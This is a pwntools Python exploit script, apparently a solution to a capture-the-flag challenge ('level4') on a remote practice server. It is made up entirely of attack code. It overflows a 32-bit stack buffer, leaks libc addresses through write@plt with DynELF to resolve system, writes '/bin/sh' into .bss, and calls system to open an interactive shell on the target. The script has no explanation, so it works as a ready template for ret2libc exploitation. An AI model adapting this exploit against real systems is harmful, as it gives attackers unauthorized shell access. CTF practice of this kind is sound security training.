from pwn import *

context.log_level = "info"

elf = ELF("./level4")

#sock = process(elf.path)
sock = remote("node4.buuoj.cn", 29820)

def leak(addr):
    payload = b"A" * (0x88 + 4)
    payload += p32(elf.plt["write"])
    payload += p32(elf.sym["_start"])
    payload += p32(1)
    payload += p32(addr)
    payload += p32(4)

    sock.send(payload)
    sleep(0.01)
    leaked = sock.recv(4)
    info("leaked -> {}".format(leaked))
    return leaked

d = DynELF(leak, elf = elf)
system_addr = d.lookup('system', 'libc')
success("system -> {:#x}".format(system_addr))
pause()

payload = b"A" * (0x88 + 4)
payload += p32(elf.sym["read"])
payload += p32(elf.sym["_start"])
payload += p32(0)
payload += p32(elf.bss() + 0x500)
payload += p32(8)
sock.send(payload)
sleep(0.01)
sock.send(b"/bin/sh\x00")
sleep(0.01)

payload = b"A" * (0x88 + 4)
payload += p32(system_addr)
payload += b"BBBB"
payload += p32(elf.bss() + 0x500)
sock.send(payload)

sock.interactive()
